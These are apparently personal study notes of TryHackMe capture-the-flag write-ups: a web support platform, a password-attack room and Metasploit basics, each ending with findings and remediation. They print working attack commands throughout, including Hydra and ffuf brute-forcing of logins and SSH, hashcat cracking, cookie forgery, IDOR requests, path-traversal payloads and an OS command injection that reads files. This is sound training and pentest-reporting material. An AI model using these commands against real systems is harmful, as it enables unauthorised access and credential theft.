```

---

#### Remediation & Recommendations

**1. Fix the LFI/SSRF vector on `file.php`**

- Never let user input directly control a file path or URL scheme (`file://`, `http://`, etc.)
- Enforce a strict **allowlist** of permitted filenames/identifiers rather than accepting arbitrary paths — the application should map an internal ID to a known file, not take a path from the client at all

**2. Fix the SQL Injection on the search feature**

- Replace string-concatenated queries with **parameterised queries / prepared statements** everywhere user input touches the database — this is the only complete fix, not a supplementary one
- Do not rely on input filtering/escaping alone

**3. Credential and file-permission hygiene**

- Never store plaintext credentials (`$HR_PASSWORD = 'hrpassword123';`) inside application configuration files, even "temporarily during rollout" — this is exactly the kind of exception that becomes permanent and gets found
- Hash all stored passwords with a strong algorithm (**bcrypt**, **Argon2**) — the plaintext `admin@001admin` recovered via SQLi should never have been retrievable in readable form even with a successful injection
- Remove operational/deployment logs (`mail.log` and similar) from any web-accessible directory — these belong outside the webroot entirely, not just access-restricted within it

> [!summary] Quick Recap — Remediation
> 
> - LFI fix: allowlist known filenames, never accept raw paths/URL schemes from the client
> - SQLi fix: parameterised queries everywhere — the actual fix, not a mitigation
> - Broader hygiene: no plaintext credentials in config files, hash all stored passwords, keep operational logs entirely outside the webroot

---

> [!summary] Room Result **Flag 1** (logged in as normal user): `THM{LOGGED_IN_USER}` **Flag 2** (logged in as admin): `THM{LOGGED_IN_ADM1N1}`
> 
> A clean demonstration of vulnerability chaining: an information-disclosure bug that wasn't itself exploitable directly still shaped the entire subsequent attack path, an LFI filter that blocked the _format_ of input rather than the _access_ it granted, and a classic unsanitised search field that closed out full admin compromise.

### 3. Support CTF

#### Room Description

> A new internal Support Operations Platform has been deployed to assist IT and helpdesk teams. The application handles user management, internal APIs, and system-level operations. However, security was not the primary focus during development. Several features rely on user-controlled input and weak trust boundaries.
> 
> **Objective:** Pentest the platform and escalate access to achieve RCE on the server.
> 
> **Questions:**
> 
> - What is the flag value after logging in as admin?
> - What is the content of the file `/home/ubuntu/user.txt`?

#### Executive Summary

This assessment targeted the Support Operations Platform to determine whether an attacker could gain unauthorized access and compromise the underlying server. Multiple critical weaknesses were found across authentication, authorization, source code protection, and command execution. Individually, several of these expose sensitive information — but chained together, they let an authenticated low-privileged user escalate to administrator and ultimately achieve **Remote Code Execution (RCE)**.

No memory corruption or complex exploitation was required. The entire chain relied on **insecure application design, weak trust boundaries, and insufficient server-side authorization**.

#### Scope & Methodology

**Target:** Support Operations Platform **Objective:** Assess security posture; determine whether privilege escalation and RCE are achievable.

**Methodology:** Reconnaissance → Service Enumeration → Web Enumeration → Authentication Assessment → Authorization Testing → API Security Testing → Source Code Review → Privilege Escalation → Command Injection Testing → Post-Exploitation Verification.

#### Attack Timeline

**1. Network Enumeration**

An Nmap scan identified two exposed services:

|Port|Service|
|---|---|
|22|SSH|
|80|Apache HTTP Server|

**2. Web Enumeration**

Directory enumeration turned up several interesting files: `index.php`, `dashboard.php`, `api.php`, `config.php`, `info.php`.

The publicly accessible `info.php` was the most valuable early lead — a public PHP info page directly reveals the tech stack, and sometimes credentials or endpoints. It confirmed:

- **PHP** 8.3.6 on **Linux**, Apache 2.0 Handler
- **Apache/2.4.58 (Ubuntu)**
- `SERVER_ADMIN`: `webmaster@localhost`
- FTP support and JSON support enabled
- OpenSSL default config at `/usr/lib/ssl/openssl.cnf`
- Environment `USER`: `root`

This gave half a credential pair (`webmaster@localhost`), though the main login page pointed to a different, more relevant contact address for support issues: `help@support.thm` — this became the username to target for brute-forcing.

**3. Authentication**

The application exposed a helpdesk contact address, `help@support.thm`, which doubled as a login username. Since there appeared to be no rate limiting on the login endpoint, this was fuzzed against `rockyou.txt`:

```bash
ffuf -w rockyou.txt -X POST -d "email=help@support.thm&password=FUZZ" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -u http://10.114.183.31 -fs 2678
```

This returned a valid password, `snoopy`, confirmed with:

```bash
curl -i -X POST -d "email=help@support.thm&password=snoopy" http://10.114.183.31
```

The response set two cookies — `PHPSESSID` and, notably, `isITUser=68934a3e9455fa72420237eb05902327` — and redirected to `dashboard.php`, granting access to the Helpdesk dashboard.

**4. Privilege Escalation via Client-Controlled Cookie**

The `isITUser` cookie stood out as the likely role/privilege indicator. Decoding the hash `68934a3e9455fa72420237eb05902327` (MD5) resolved to the string **`false`** — meaning the application was trusting a client-side MD5 hash to represent a boolean privilege flag.

Since MD5 is unsalted and reversible-by-lookup for simple values, computing the hash of the string `true` and swapping it into the cookie (via the browser dev tools / request editor) was enough to escalate to an **IT user** role — unlocking access to `api.php`.

This is a textbook **client-side authorization** failure: the server never re-derived or validated the role server-side, it just trusted whatever hash the client presented.

**5. API Assessment — IDOR**

As an IT-level user, the API exposed:

```
GET /user/3
```

```json
{
    "email": "help@support.thm",
    "2FA": false,
    "admin": false
}
```

This is the authenticated user's own profile (user ID 3). The natural next test — since object IDs are exposed directly and sequentially — was to request a different ID:

```
GET /user/1
```

```json
{
    "email": "specialadmin@support.thm",
    "2FA": false,
    "admin": true
}
```

No ownership check was performed — any authenticated user could pull any other user's profile by ID. This confirmed a classic **IDOR** (Insecure Direct Object Reference), and immediately revealed the administrator's email address: `specialadmin@support.thm`.

A `PATCH` was also attempted against the endpoint to see whether the `admin` field could be written directly:

```bash
curl -i -X PATCH \
  -H "Content-Type: application/json" \
  -H "Cookie: PHPSESSID=ipkl1euqmfmiutdumgo4i7r8vj; isITUser=<md5-of-true>" \
  -d '{"admin":true}' \
  http://10.114.183.31/user/3
```

This returned `200 OK` but the `admin` field stayed `false` — the endpoint accepted writes but silently ignored/rejected changes to that field, so escalation via mass assignment on this endpoint was a dead end. The IDOR read path remained the useful lead.

**6. Source Code Disclosure — Path Traversal**

`dashboard.php` accepted a `skin` parameter. Testing path traversal:

```
dashboard.php?skin=../dashboard
```

returned the message _"You have successfully authenticated as an administrator"_ along with the **raw PHP source** of the file, since the traversal escaped the intended `skins/` directory:

```php
<?php
session_start();
if (!isset($_SESSION['loggedin'])) {
    header('Location: index.php');
    exit;
}
$isIT = $_COOKIE['isITUser'] ?? md5("false");
$skin = $_GET['skin'] ?? 'default';
?>
<!DOCTYPE html>
<html>
<head>
    <title>Dashboard</title>
    <link href="layout/bootstrap.min.css" rel="stylesheet">
</head>
<body>
<?php
$webRoot = realpath('/var/www/html/skins');
$another = realpath('/var/www/html');
$requested = realpath($webRoot . '/' . $skin . '.php');
if ($requested !== false && strpos($requested, $another) === 0) {
    readfile($requested);
}
?>
```

The path check (`strpos($requested, $another) === 0`) validates against `/var/www/html` — the **web root itself**, not the intended `skins/` subdirectory — so any PHP file inside the web root, not just skins, could be read via traversal. Pivoting the same technique onto the config file:

```
dashboard.php?skin=../config
```

disclosed `config.php`'s source, including a hardcoded credential:

```php
<?php
$MASTER_PASSWORD = 'support@110';
$SITE_VER = '1.0';
$SITE_NAME = 'support_portal';
```

**7. Administrative Access**

Combining the administrator's email recovered from the IDOR (`specialadmin@support.thm`) with the hardcoded `MASTER_PASSWORD` (`support@110`) from the disclosed source gave valid administrator credentials. Logging in as the administrator returned:

```
THM{I_AM_ADMIN999}
```

**8. Command Injection**

The admin dashboard included a date/time display feature. Inspecting the request in the browser's network tab showed a request body of:

```
sys=date
```

Appending a shell metacharacter and a second command:

```
sys=date; ls
```

was executed unsanitized by the server, returning a directory listing:

```
api.php
config.php
dashboard.php
footer.php
includes
index.php
info.php
js
layout
logout.php
skins
```

This confirmed unsanitized **OS command injection** in the `sys` parameter.

**9. Remote Code Execution**

Using the same injection point to read the target user flag:

```
sys=date;cat /home/ubuntu/user.txt
```

```
THM{GOT_THE_FLAG001}
```

This confirmed full **Remote Code Execution** on the target server.

#### Findings

**Finding 1 — Weak Authentication** · Severity: **Medium** A valid helpdesk account was protected only by a weak password, successfully identified via password fuzzing (no apparent rate limiting). _Impact:_ Attacker obtains authenticated access to the application.

**Finding 2 — Client-Side Authorization** · Severity: **Critical** The application relied on a client-controlled cookie (`isITUser`, an MD5 hash of a boolean string) to determine user privileges. Manipulating the cookie value granted unauthorized access to privileged (IT) functionality. _Impact:_ Privilege escalation from Helpdesk user to IT user.

**Finding 3 — Insecure Direct Object Reference (IDOR)** · Severity: **High** `GET /user/<id>` did not verify whether the authenticated user was authorized to access the requested object. _Impact:_ Disclosure of sensitive user information, including administrator account details.

**Finding 4 — Path Traversal / PHP Source Code Disclosure** · Severity: **Critical** The `skin` parameter allowed traversal outside the intended `skins/` directory and disclosure of arbitrary PHP source files within the broader web root, due to the containment check validating against the wrong base directory. _Impact:_ Exposure of application source code and hardcoded credentials.

**Finding 5 — Hardcoded Credentials** · Severity: **High** The application stored a master password directly in source code (`config.php`). _Impact:_ Disclosure of administrative credentials following source code exposure.

**Finding 6 — OS Command Injection** · Severity: **Critical** The `sys` parameter was passed to OS command execution without validation or sanitization. _Impact:_ An authenticated administrator can execute arbitrary commands on the underlying server, resulting in full Remote Code Execution.

#### Risk Assessment

|Finding|Severity|
|---|---|
|Weak Authentication|Medium|
|Client-Side Authorization|Critical|
|IDOR|High|
|Path Traversal / Source Disclosure|Critical|
|Hardcoded Credentials|High|
|OS Command Injection|Critical|

#### Remediation

- Implement **server-side** authorization checks for all privileged functionality — never trust a client-supplied cookie/flag for role determination.
- Remove client-controlled privilege indicators such as `isITUser` entirely; derive role from server-side session state.
- Enforce object-level authorization on all API endpoints (verify the authenticated user owns/may access the requested object ID).
- Prevent path traversal by validating user input against a strict allowlist rather than a prefix/`realpath` containment check against too broad a base directory.
- Remove hardcoded credentials from source code; store secrets in a secure secrets manager or environment configuration outside the web root.
- Eliminate shell command execution built from user-controlled input. Where system interaction is required, use safe APIs and parameterized execution mechanisms — never string-concatenate user input into a shell command.
- Implement strong password policies and account lockout / rate limiting on authentication endpoints.
- Conduct secure code reviews before deployment.

#### Conclusion

This assessment identified multiple critical vulnerabilities that, chained together, enabled complete compromise of the Support Operations Platform. The attack progressed through weak authentication → client-side privilege escalation → IDOR-based authorization bypass → source code disclosure → hardcoded credential recovery → administrative compromise → OS command injection → full Remote Code Execution.

It underscores the importance of secure authentication, **server-side** authorization, proper input validation, secure secret management, and defense-in-depth throughout the application lifecycle.

> [!summary] Quick Recap — Support CTF
> 
> - **Recon**: a public `info.php` handed over the full stack (PHP/Apache/Linux versions) — always check for this before anything else
> - **Auth**: no rate limiting on login → `ffuf` against `rockyou.txt` cracked a weak password in minutes
> - **Priv-esc #1**: role stored client-side as an MD5 hash in a cookie (`isITUser`) — swap the hash of `false` for the hash of `true` to become an "IT user"
> - **IDOR**: `/user/<id>` had no ownership check — walking the ID (`3` → `1`) leaked the admin's email and confirmed `admin:true`; a `PATCH` to force `admin:true` on your _own_ record was blocked, but the read-path IDOR was enough
> - **Path traversal → source disclosure**: `?skin=../config` escaped the intended `skins/` directory because the containment check validated against the whole web root instead of that subdirectory — leaked a hardcoded `MASTER_PASSWORD`
> - **Chain to admin**: leaked admin email (IDOR) + leaked master password (source disclosure) = full admin login → flag #1
> - **Command injection → RCE**: an admin-only "date" feature passed `sys=` straight to a shell; `sys=date;cat /home/ubuntu/user.txt` = flag #2
> - **Root cause theme**: every step is a trust-boundary failure — trusting a client cookie for role, trusting a client-supplied ID for ownership, trusting a "contained" path, trusting unsanitized shell input
### 4. Checkmate — CTF Walkthrough & Report

> [!info] Room context **Checkmate** — Marco Bianchi, a systems administrator, deployed several internal services (firewall console, employee portal, social platform, SSH access) under tight deadlines and reused weak, predictable, pattern-based passwords across all of them. Objective: conduct a password security assessment against these services, starting from `http://10.112.169.24:5000`, progressively uncovering and exploiting Marco's authentication weaknesses across 5 levels.

> [!summary] Executive Summary A password security assessment against four services deployed by Marco Bianchi — firewall management console, employee portal, social platform, and SSH — demonstrated that every authentication mechanism could be compromised through targeted password attacks. Rather than relying on large generic wordlists, the assessment succeeded by combining OSINT, organisational intelligence, personal information, and predictable password-construction patterns into small, highly targeted candidate lists. The core lesson: **the weakness was never the cracking tools — it was the predictability of human password choices.**

**Scope:** Firewall Management Console, Employee Portal, Social Platform, SSH Service.

**Methodology:** target enumeration → authentication analysis → password intelligence gathering → custom wordlist generation → password auditing → hash analysis → pattern-based password generation → cross-service credential validation.

---

#### Level 1 — Default Credentials Assessment

**Target:** Firewall Management Console, `firewall.thm:5001`.

**Setup:**

```bash
echo "10.112.169.24 firewall.thm jobs.thm social.thm" | sudo tee -a /etc/hosts
```

**Manual testing first** — common guesses (`admin`/`password`/`123456`) failed outright. Rather than continuing to guess blind, the login request was analysed directly to extract exactly what a brute-force tool would need:

- Request method: `POST`
- Login endpoint: `/login`
- Parameters: `username`, `password`
- Failure message: `Invalid credentials.`

**Wordlist choice reasoning:** the room's own framing hinted the admin account might still be sitting on vendor default credentials — so rather than a generic password list, a **default-credentials-specific** wordlist was the deliberate choice:

```bash
hydra -l admin \
  -P /usr/share/wordlists/SecLists/Passwords/Default-Credentials/default-passwords.txt \
  -f -V -t4 \
  -s 5001 \
  firewall.thm http-post-form \
  "/login:username=^USER^&password=^PASS^:Invalid credentials."
```

**Result:**

```
[5001][http-post-form] host: firewall.thm   login: admin   password: 12345
```

**Credentials:** `admin` / `12345`

> [!warning] Finding — Default Credentials (Critical) The firewall management console remained protected only by a weak, unrotated default password — direct administrative access to critical infrastructure with no exploitation required beyond the correct wordlist choice.

> [!summary] Quick Recap — Level 1
> 
> - Manual common-password guessing failed — pivoted to request analysis (`POST`, `/login`, `username`/`password`, `Invalid credentials.`) before automating
> - The specific wordlist choice (default-credentials list, not a generic one) was driven directly by a contextual hint — matching wordlist to scenario, not brute-forcing blind

---

#### Level 2 — Organisation-Specific Password Assessment

**Target:** Employee Portal, `jobs.thm:5002`. Hint: Marco used common company keywords as passwords.

**Intelligence gathering** — rather than guessing at company vocabulary, **CeWL** crawled the portal itself to extract real, in-context keywords:

```bash
cewl -d 2 -m 6 --lowercase -w keywords.txt http://jobs.thm:5002
```

**Password audit with the resulting company-specific dictionary:**

```bash
hydra -l marco \
  -P keywords.txt \
  -f -V -t4 \
  -s 5002 \
  jobs.thm http-post-form \
  "/login:username=^USER^&password=^PASS^:Invalid credentials."
```

**Result:**

```
[5002][http-post-form] host: jobs.thm   login: marco   password: excellence
```

**Credentials:** `marco` / `excellence`

> [!warning] Finding — Organisation-Based Passwords (High) A password derived directly from company terminology drastically reduces the effective search space — a CeWL-generated dictionary of a few hundred scraped words outperformed any generic wordlist for this specific target.

> [!summary] Quick Recap — Level 2
> 
> - CeWL turned the target's own public-facing content into the exact wordlist needed — no generic list would have contained `excellence` with any priority
> - This is the same OSINT-to-wordlist pipeline covered in the Introduction to Wordlists room, applied directly against a live login form

---

#### Level 3 — Personal Information Password Assessment

**Target:** Social Platform, `social.thm:5003`. Hint: derive Marco's password from personal info.

**Intelligence carried over from Level 2's reconnaissance:**

- Full Name: **Marco Bianchi**
- Nickname: **marky**
- Birthdate: **14/02/1995**

**Tool: CUPP (Common User Passwords Profiler)** — builds a personalised candidate dictionary from exactly this kind of personal data:

```bash
git clone https://github.com/Mebus/cupp.git
cd cupp
python3 cupp.py -i
```

Interactive prompts supplied: First Name `Marco`, Surname `Bianchi`, Nickname `marky`, Birthdate `14021995` — all other fields (partner, child, pet, company) left blank since that data wasn't available. Output: **3,122 candidate passwords** saved to `marco.txt`.

**Password audit:**

```bash
hydra -l marco \
  -P marco.txt \
  -f -V -t4 \
  -s 5003 \
  social.thm http-post-form \
  "/login:username=^USER^&password=^PASS^:Invalid credentials."
```

**Result:**

```
[5003][http-post-form] host: social.thm   login: marco   password: Bianchi2495
```

**Credentials:** `marco` / `Bianchi2495` (surname + reversed/partial birth year pattern)

> [!warning] Finding — Personal Information Reuse (High) Publicly available personal details (name, nickname, birthdate) fed into a purpose-built profiler tool generated a small, highly accurate candidate list — a direct demonstration of how OSINT collapses password search space far more effectively than list size alone.

> [!summary] Quick Recap — Level 3
> 
> - CUPP is purpose-built for exactly this: name/nickname/birthdate → thousands of realistic personal-pattern password candidates
> - Even a modest amount of personal data (no partner/child/pet info available) still produced a working 3,122-entry list — CUPP degrades gracefully with partial information
> - The winning password combined surname + birth year fragments — the classic human pattern CUPP is designed to anticipate

---

#### Level 4 — Hash Analysis

**Target:** Social Platform, `social.thm:5003`. Task: recover the original filename of Marco's uploaded profile picture, stored as `SHA256(original_filename).png`.

**Enumeration:** after logging into Marco's account (Level 3 credentials), inspecting the profile image via page source revealed the stored, hashed filename:

```
d34a569ab7aaa54dacd715ae64953455d86b768846cd0085ef4e9e7471489b7b.png
```

**Cracking the hash** — the hash itself (SHA-256) is cryptographically sound, but the **input** (a filename) is exactly the kind of short, guessable string a dictionary attack handles well:

```bash
hashcat -m 1400 hash.txt /usr/share/wordlists/rockyou.txt
```

- `-m 1400` = raw SHA-256 mode

**Result:**

```
d34a569ab7aaa54dacd715ae64953455d86b768846cd0085ef4e9e7471489b7b:family
```

**Recovered filename:** `family`

> [!warning] Finding — Predictable Hash Inputs (Medium) Hashing itself was never the weak point — SHA-256 is not broken here. The weakness is that the **input space** (a human-chosen filename) is small and predictable enough that a standard breach-derived wordlist (`rockyou.txt`) recovers it almost immediately. Strong hashing algorithms provide no protection when the underlying plaintext is low-entropy.

> [!summary] Quick Recap — Level 4
> 
> - A secure hash algorithm doesn't protect a predictable input — this is the same principle as weak passwords hashed with a strong algorithm, just applied to a filename instead of a password
> - `-m 1400` (raw SHA-256) + `rockyou.txt` was sufficient — no need for rules or masks when the target string is a common English word

---

#### Level 5 — Password Pattern Analysis

**Target:** SSH service, `10.112.169.24:22`. Task: use Marco's publicly disclosed password-construction habits to generate a targeted wordlist and brute-force SSH directly.

**Intelligence gathering** — Marco himself posted his password methodology publicly on the social platform:

> "My tip for strong password: I take a company keyword, capitalize it, then append the year like 2024 or any other number and an exclamation mark."

**Disclosed keywords:** `security`, `excellence`, `innovation`, `digital`, `cloud` **Pattern:** `Capitalised Keyword + Year + !`

**Wordlist generation with Crunch** — one targeted pattern per keyword, rather than one giant combined brute force:

```bash
crunch 13 13 0123456789! -t Security20%%! > passlist.txt
crunch 15 15 0123456789! -t Excellence20%%! >> passlist.txt
crunch 15 15 0123456789! -t Innovation20%%! >> passlist.txt
crunch 12 12 0123456789! -t Digital20%%! >> passlist.txt
crunch 10 10 0123456789! -t Cloud20%%! >> passlist.txt
```

Each `crunch` call fixes the length to match its specific keyword + `20` + two digits + `!`, and `%%` expands to every two-digit combination (`00`–`99`) — five small, purpose-built candidate sets concatenated into one final list.

**Brute-forcing SSH directly** (not a web form this time):

```bash
hydra -l marco \
  -P passlist.txt \
  -f -V -t4 \
  10.112.169.24 ssh
```

**Result:**

```
[22][ssh] host: 10.112.169.24   login: marco   password: Security2024!
```

**Credentials:** `marco` / `Security2024!`

> [!warning] Finding — Predictable Password Construction (Critical) Publicly disclosing a password _methodology_ is functionally equivalent to disclosing the password itself — it collapses the entire keyspace down to a handful of keyword/year/symbol combinations. This was the highest-severity finding of the assessment: it directly compromised SSH access to critical infrastructure using a wordlist of only a few hundred entries total.

> [!summary] Quick Recap — Level 5
> 
> - The vulnerability here wasn't technical at all — it was Marco publicly explaining exactly how he builds passwords
> - Crunch's `%%` template syntax turned a known _pattern_ (not just known words) into an exhaustive-but-tiny candidate set — the same technique from the Wordlists room, applied to SSH instead of a web login
> - SSH brute-forcing with Hydra needs no `http-post-form` string — just `hydra -l user -P list target ssh`

---

#### Findings Summary

|Finding|Severity|Impact|
|---|---|---|
|Default Credentials (firewall)|**Critical**|Full administrative access to critical infrastructure|
|Organisation-Based Passwords|High|Passwords vulnerable to custom dictionaries built from public org content|
|Personal Information Reuse|High|Personal-data profiling drastically reduced password search space|
|Predictable Hash Inputs|Medium|Sensitive filenames recoverable via standard dictionary attack despite strong hashing|
|Predictable Password Construction|**Critical**|Publicly disclosed methodology enabled near-total SSH compromise with a tiny wordlist|

---

#### Remediation & Recommendations

1. Eliminate all vendor default credentials before any system reaches production
2. Enforce strong password policies requiring genuine entropy and complexity — not just character-class checkboxes
3. Prevent password reuse across systems and services
4. Prohibit passwords built from company names, products, departments, or internal terminology
5. Educate staff on the risk of incorporating publicly available personal information into passwords
6. **Never disclose password construction methodologies publicly** — this alone caused the most severe compromise in this assessment
7. Implement MFA for all administrative services, at minimum
8. Monitor authentication logs for password-spraying and targeted dictionary-attack patterns
9. Implement account lockout and rate limiting on every authentication endpoint
10. Encourage password managers generating unique, random passwords over any human-memorable scheme

> [!summary] Quick Recap — Remediation
> 
> - Every fix here maps directly to one of the five findings — no generic advice, all traceable to a specific demonstrated compromise
> - Recommendation 6 (never disclose password methodology) is the standout: it's the only finding where the vulnerability was purely behavioural, not technical, and it produced the most severe result of the entire assessment

---

#### Full Attack Chain — One Glance

```
Firewall console (default creds)              →  admin / 12345
        │
        ▼
Employee portal (CeWL company-keyword dict)     →  marco / excellence
        │
        ▼
Social platform (CUPP personal-info dict)       →  marco / Bianchi2495
        │
        ▼
Hash recovery (Hashcat + rockyou.txt)           →  filename: family
        │
        ▼
SSH (Crunch pattern-based dict from disclosed
     password methodology)                      →  marco / Security2024!
```

> [!summary] Conclusion Password attacks proved most effective when guided by **intelligence**, not wordlist size. Across five levels, escalating sources of intelligence — vendor defaults, organisational content, personal information, predictable hash inputs, and finally a self-disclosed construction methodology — each collapsed a login's effective keyspace down to a targeted, small candidate list. The consistent theme throughout: the cracking tools (Hydra, Hashcat, CeWL, CUPP, Crunch) were never the bottleneck — **human password predictability was.** Strong password policies, unique per-service credentials, MFA, and basic operational-security awareness (not disclosing password habits publicly) would have independently broken every stage of this chain.
## . Metasploit

### Metasploit: Introduction

Metasploit is the most widely used exploitation framework — a powerful tool supporting all phases of a penetration testing engagement, from information gathering to post-exploitation. The Metasploit Framework is a set of tools allowing information gathering, scanning, exploitation, exploit development, post-exploitation, and more. While its primary use is penetration testing, it's also useful for vulnerability research and exploit development.

**Main components of the Metasploit Framework:**
- **msfconsole** — the main command-line interface
- **Modules** — supporting modules such as exploits, scanners, payloads, etc.
- **Tools** — standalone tools helping with vulnerability research, assessment, or pentesting. Some examples: msfvenom, pattern_create, pattern_offset. This module covers msfvenom; pattern_create/pattern_offset are useful in exploit development, beyond this module's scope.

**Main components, in more depth:**
Launch from the terminal: `msfconsole`. The console is your main interface for interacting with different modules. Modules are small components built to perform a specific task — exploiting a vulnerability, scanning a target, brute-forcing, etc.

Clarifying three recurring concepts:
- **Exploit** — a piece of code that uses a vulnerability present on the target system.
- **Vulnerability** — a design, coding, or logic flaw affecting the target. Exploitation can disclose confidential information or let the attacker execute code.
- **Payload** — an exploit takes advantage of a vulnerability, but if we want the result we actually want (access, reading confidential info, etc.), we need a payload — the code that runs on the target.

**Modules and categories** (interacted with via msfconsole):
- **Auxiliary** — supporting modules: scanners, crawlers, fuzzers.
- **Encoders** — encode the exploit/payload, hoping a signature-based antivirus might miss them.
- **Evasion** — unlike encoders (which just encode), evasion modules actively try to evade antivirus, with more or less success.
- **Exploits** — neatly organized by target system.
- **NOPs** — No OPeration; do literally nothing (represented as `0x90` on Intel x86, the CPU does nothing for one cycle). Often used as a buffer for consistent payload sizes.
- **Payloads** — the code that runs on the target. Four directories:
  - **Adapters** — wraps single payloads into different formats, e.g. a single payload wrapped inside a PowerShell adapter to make one PowerShell command that executes the payload.
  - **Singles** — self-contained payloads (add user, launch notepad.exe, etc.) that don't need to download an additional component to run.
  - **Stagers** — set up a connection channel between Metasploit and the target. Useful with staged payloads — a small stager uploads first, then downloads the rest (the stage). Advantage: the initial payload size is small compared to sending the full payload at once.
  - **Stages** — downloaded by the stager, allowing use of larger payloads.
- **Post** — useful in the final stage of the pentesting process: post-exploitation.

**msfconsole:**
Launch with `msfconsole` in the terminal. Managed by context — unless set as a global variable, all parameter settings are lost when you change the module you're using. Select a module with `use` followed by its name, or the number at the start of a search result line. The prompt reflects the current context; `show options` lists parameters. `show` followed by a module type (auxiliary, payload, exploit, etc.) lists available modules of that type — e.g. listing payloads usable with the ms17-010 EternalBlue exploit. Leave a context with `back`. Get more info on the current module with `info`.

**Search:**
One of the most useful msfconsole commands. `search` looks the Metasploit Framework database for modules relevant to a given parameter — CVE numbers, exploit names (eternalblue, heartbleed, etc.), or target system. Direct the search with keywords like `type` and `platform`, e.g.:
```
search type:auxiliary telnet
```

**Working with Modules:**
After `use MODULE`, set parameters as needed — different modules need different/additional parameters. Good practice: `show options` to list required parameters. All parameters use:
```
set PARAMETER_NAME VALUE
```

**Five Metasploit prompt types:**
- **The regular command prompt** — Metasploit commands don't work here.
- **The msfconsole prompt** — `msf6` (or `msf5`); no context set, so context-specific commands (set parameters, run modules) don't work here.
- **A context prompt** — once you `use` a module, the console shows the context; context-specific commands (e.g. `set RHOSTS 10.10.x.x`) work here.
- **The Meterpreter prompt** — an important payload covered later; means a Meterpreter agent loaded on the target and connected back. Meterpreter-specific commands work here.
- **A shell on the target system** — once exploitation completes, you may have a regular command-line shell on the target; all commands typed here run on the target.

**Parameters you'll often use:**
- **RHOSTS** — "Remote host," the target's IP. Can be a single IP, network range, CIDR notation (/24, /16, etc.), or a file listing targets one per line (`file:/path/of/target_file.txt`).
- **RPORT** — "Remote port," the port the vulnerable application runs on.
- **PAYLOAD** — the payload used with the exploit.
- **LHOST** — "Localhost," the attacking machine's (AttackBox/Kali) IP.
- **LPORT** — "Local port," the port used for the reverse shell to connect back to — any port not in use by another application.
- **SESSION** — each connection established via Metasploit gets a session ID, used with post-exploitation modules connecting to the target over an existing connection.

Override a set parameter by using `set` again with a different value. Clear a parameter with `unset`, or clear all set parameters with `unset all`. Use `setg` to set values used for all modules by default — normally, switching modules loses your `set` values, but `setg` values persist across modules. Clear a `setg` value with `unsetg`.

**Using modules:**
Once all module parameters are set, launch with `exploit`. Metasploit also supports `run` as an alias, since "exploit" didn't quite make sense for modules that aren't exploits (port scanners, vulnerability scanners, etc.). `exploit` can be used with no parameters, or with `-z`, which runs the exploit and immediately backgrounds the session once it opens. Some modules support `check`, which checks if the target is vulnerable without exploiting it.

**Sessions:**
`background` backgrounds the session prompt, returning to msfconsole. `CTRL+Z` also backgrounds sessions. `sessions` (from the msfconsole prompt or any context) lists existing sessions. `sessions -i` followed by the session number lets you interact with any session.

### Metasploit: Exploitation

**Intro** — using Metasploit for vulnerability scanning and exploitation, including how the database feature makes managing pentesting engagements easier with a broader scope, generating payloads with msfvenom, and starting a Metasploit session on most target platforms.

**Scanning:**
- **Port Scanning** — list potential port scanning modules with `search portscan`. You can run Nmap scans directly from the msfconsole prompt for a faster approach. For information gathering, if your engagement needs speedier port scanning, Metasploit may not be your first choice — but a number of modules are still useful for the scanning phase.
- **UDP Service Identification** — `scanner/discovery/udp_sweep` quickly identifies services running over UDP. Not an exhaustive scan of all possible UDP services, but a quick way to identify services like DNS or NetBIOS.
- **SMB Scans** — several useful auxiliary modules scan specific services. Particularly useful in a corporate network: `smb_enumshares` and `smb_version` — worth spending time to identify what other scanners your installed Metasploit version offers.

**The Metasploit Database:**
Simplifies project management and avoids confusion when setting parameter values. First, start PostgreSQL:
```
systemctl start postgresql
```
Then initialize the Metasploit database:
```
msfdb init
```
Running this as root gives "Please run msfdb as a non-root user" — solve by running as the `postgres` account:
```
sudo -u postgres msfdb init
```
Launch `msfconsole` and check database status with `db_status`.

The database lets you create **workspaces** to isolate different projects. When first launched, you're in the default workspace. List workspaces with `workspace`. Add a workspace with `-a`, delete with `-d`. The new database name prints in red, starting with a `*`. `workspace -h` lists available options.

Running a scan with `db_nmap` saves all results to the database. Reach host/service info with the `hosts` and `services` commands respectively. `hosts -h` and `services -h` list their options. Once host info is stored, `hosts -R` adds it to the `RHOSTS` parameter — if more than one host is saved, all IPs get used when `hosts -R` is run.

Typical engagement scenario:
- Find available hosts with `db_nmap`
- Scan those for further vulnerabilities/open ports (using a port scanning module)

`services -S` lets you search for specific services in the environment.

**Vulnerability scanning:**
Metasploit can quickly identify some critical vulnerabilities considered "low hanging fruit" — easily identifiable and exploitable vulnerabilities that could give a foothold on a system.

**Exploitation:**
Search for exploits with `search`. Get more information with `info`. Launch with `exploit`. Most exploits have a preset default payload, but you can always check alternatives with `show payloads`. Once you decide on a payload, `set payload` makes your choice. Some payloads open new required parameters — check with `show options`. Once a session opens, background it with `CTRL+Z`, or abort with `CTRL+C`. Backgrounding is useful when working on more than one target simultaneously, or the same target with a different exploit/shell.

**Working with sessions:**
`sessions` lists all active sessions and supports a number of options to help manage them better. Interact with any existing session using `sessions -i` followed by the session ID.

**Msfvenom:**
Access all payloads available in the Metasploit framework. Create payloads in many formats (PHP, exe, dll, elf, etc.) for many target systems (Apple, Windows, Android, Linux, etc.).

- **Output formats** — generate standalone payloads (e.g. a Windows executable for Metasploit), or get a usable raw format (e.g. python). `msfvenom --list formats` lists supported output formats.
- **Encoders** — contrary to some beliefs, encoders don't aim to bypass installed antivirus; they encode the payload. Can be effective against some AV, but modern obfuscation techniques or shellcode-injection methods are a better solution. Example: using `-e` to encode a PHP Meterpreter payload in Base64, with output format `raw`.
- **Handlers** — like an exploit using a reverse shell, you need to be able to accept incoming connections generated by the msfvenom payload. When using an exploit module, this is handled automatically (remember the "payload options" title appearing when setting a reverse shell). Receiving a connection from a target is commonly called "catching a shell."

> [!summary] Quick Recap — Metasploit
> - Exploit = leverages the flaw; Vulnerability = the flaw itself; Payload = what actually runs after
> - `search` → `use` → `show options` → `set PARAM VALUE` → `exploit` (or `run`)
> - Five prompt types: regular shell → msfconsole → module context → Meterpreter → target shell
> - Staged payloads = smaller footprint, two-step delivery (stager then stage); singles = fully self-contained
> - DB workflow: `systemctl start postgresql` → `sudo -u postgres msfdb init` → `db_status` → `db_nmap` → `hosts -R` to auto-fill RHOSTS
> - `set` = per-module; `setg`/`unsetg` = global across modules
> - `msfvenom` for standalone payloads outside an exploit module — remember you still need a handler/listener to catch the shell

---

